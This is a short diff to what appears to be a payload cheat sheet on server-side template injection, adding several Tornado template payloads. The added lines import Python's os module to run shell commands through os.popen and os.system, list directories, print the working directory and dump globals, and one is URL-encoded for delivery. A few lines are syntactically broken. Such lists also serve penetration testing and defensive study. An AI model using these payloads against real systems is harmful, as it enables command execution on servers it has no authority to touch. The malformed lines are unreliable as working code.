@@ -35,5 +35,12 @@ Then inject the second payload : `{{config.from_object('os')}}
 #### Tornado payload
 
 ```py
+{%import%20os%}{{os.popen("ls").read() }}
 {% import os %}{{ os.popen("ls").read() }}
+{{globals()}}
+{% import os %}{{os.getcwd()}}
+{% import os %}{{os.listdir(/home/tornado)}}
+{% import os %}{{os.system(r"lookatme.txt")}}
+{{help(object name)}}
+
 ```
